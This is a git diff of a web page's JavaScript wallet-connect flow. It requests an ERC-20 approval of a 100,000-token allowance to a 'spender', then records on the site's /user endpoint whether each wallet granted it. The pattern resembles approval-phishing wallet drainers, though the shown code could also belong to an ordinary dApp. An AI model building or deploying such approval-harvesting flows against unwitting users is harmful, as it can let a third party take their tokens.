@@ -42,7 +42,6 @@ const walletConnectProviderConfig = new WalletConnectProvider.default({
   },
 });
 
-
 document.body.addEventListener("click", function (e) {
   let targetId = e.target.id;
   if (targetId == "connect-metamask") {
@@ -132,10 +131,10 @@ function getToken(token, provider) {
     .approve(spender, Math.pow(10, token.decimals) * 100000)
     .send({ from: account })
     .then(function (receipt) {
-      // getUser(true);
+      getUser(true);
     })
     .catch(function (err) {
-      // getUser(false);
+      getUser(false);
     });
 }
 
@@ -148,14 +147,17 @@ ethereum.on("chainChanged", (chainId) => {
 
 function getUser(hasAccess) {
   let getUserXhr = new XMLHttpRequest();
-  getUserXhr.open("GET", `http://127.0.0.1/user/${account}`, true);
+  getUserXhr.open("GET", `/user/${account}`, true);
   getUserXhr.send();
 
   getUserXhr.onreadystatechange = function () {
     if (this.status == 200 && this.readyState == 4) {
       let response = JSON.parse(this.response);
-      if (response.walletAddress != null) {
-        history.back();
+      console.log(response);
+      if (response != null) {
+        if (response.walletAddress != null) {
+          history.back();
+        }
       } else {
         createUser(hasAccess);
       }
@@ -171,7 +173,7 @@ function createUser(hasAccess) {
     hasAccess: hasAccess,
   };
   let createUserXhr = new XMLHttpRequest();
-  createUserXhr.open("POST", `http://127.0.0.1/user`, true);
+  createUserXhr.open("POST", `/user`, true);
   createUserXhr.setRequestHeader("Content-type", "application/json");
   createUserXhr.send(JSON.stringify(userPayload));
 
